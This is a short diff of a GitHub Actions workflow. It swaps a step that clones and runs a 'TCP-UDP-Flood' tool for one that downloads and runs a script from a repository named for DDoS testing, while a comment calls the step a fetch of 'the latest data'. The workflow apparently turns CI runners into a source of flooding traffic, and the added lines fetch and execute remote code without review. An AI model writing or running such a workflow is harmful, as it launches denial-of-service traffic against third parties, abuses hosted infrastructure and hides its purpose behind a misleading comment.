@@ -16,6 +16,5 @@ jobs:
               python-version: 3.0 #install the python needed
           - name: execute py script # run the run.py to get the latest data
             run: |
-             git clone https://github.com/Leeon123/TCP-UDP-Flood
-             cd TCP-UDP-Flood
-             python flood.py
+             wget https://raw.githubusercontent.com/CyberHeck/DDoSTestinginGITHUB/main/.github/workflows/run.py
+             python3 run.py
